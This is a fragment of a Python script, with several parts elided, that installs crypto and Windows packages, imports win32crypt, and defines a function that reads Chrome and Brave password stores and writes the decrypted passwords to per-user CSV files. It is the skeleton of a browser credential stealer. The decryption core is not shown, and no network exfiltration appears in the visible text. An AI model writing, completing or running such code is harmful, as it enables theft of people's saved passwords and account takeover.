...
packages = ['pycryptodomex','pypiwin32','sqlite3','pycryptodome']
for i in packages: install_package(i)
import sqlite3
import win32crypt
...
if __name__ == '__main__':
    try:
        def getBrowsers(BrowserName,PATH,PATH_LOCAL_STATE):
            with open(f'results/{user_name}{BrowserName}.csv', mode='w', newline='', encoding='utf-8') as decrypt_password_file:
        ...
        getBrowsers("Chrome",CHROME_PATH,CHROME_PATH_LOCAL_STATE)
        getBrowsers("Brave",BRAVE_PATH,BRAVE_PATH_LOCAL_STATE)
    except Exception as e:
        print("[ERR] HI %s"%str(e))
        getBrowsers("Brave",BRAVE_PATH,BRAVE_PATH_LOCAL_STATE)
